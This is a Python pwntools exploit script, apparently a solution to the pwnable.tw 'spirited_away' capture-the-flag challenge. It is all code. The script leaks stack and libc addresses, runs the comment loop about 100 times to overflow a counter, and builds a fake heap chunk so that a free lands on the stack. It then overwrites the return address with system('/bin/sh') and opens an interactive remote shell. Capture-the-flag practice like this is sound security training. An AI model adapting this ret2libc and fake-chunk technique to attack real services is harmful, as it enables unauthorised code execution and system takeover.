from pwn import *

#context.log_level = "debug"	

#s = process("./spirited_away")
s = remote("chall.pwnable.tw",10204)
e = ELF("spirited_away")
libc = ELF("./libc_32_secret.so.6")

#gdb.attach(proc.pidof(s)[0])

def loop(name,age,movie,comment):
	s.recvuntil("name: ")
	s.sendline(name)
	s.recvuntil("age: ")
	s.sendline(str(age))
	s.recvuntil("movie? ")
	s.sendline(movie)
	s.recvuntil("comment: ")
	s.sendline(comment)

loop("a",1,"A"*80,"a")

s.recvuntil("A"*80)

stack = u32(s.recv(4)) - 0x68
s.recv(4)
libc_leak = u32(s.recv(4))
base = libc_leak - libc.symbols['_IO_2_1_stdout_']

sys = base + libc.symbols['system']
binsh = base + list(libc.search("/bin/sh"))[0]

print hex(stack)
print hex(base)

s.recvuntil("<y/n>: ")
s.sendline("y")

for i in range(100):
	loop("j",1,"a","b")
	s.recvuntil("<y/n>: ")
	sleep(0.1)
	s.send("y")
	sleep(0.1)
	log.info('loop : %d' % i)

s.recvuntil("name: ")
s.send("a")
s.recvuntil("movie? ")

fake = p32(0) + p32(0x41) + p32(0)*15 + p32(0x10000)

print len(fake)

s.send(fake)
s.recvuntil("comment: ")
s.send("A"*80 + p32(1111) + p32(stack))

s.recvuntil("Would you like to leave another comment? <y/n>: ")

s.send("y")

loop("A"*0x4c + p32(sys) + "AAAA" + p32(binsh),1,"a","a")
s.recvuntil("<y/n>: ")
s.sendline("n")
s.interactive()
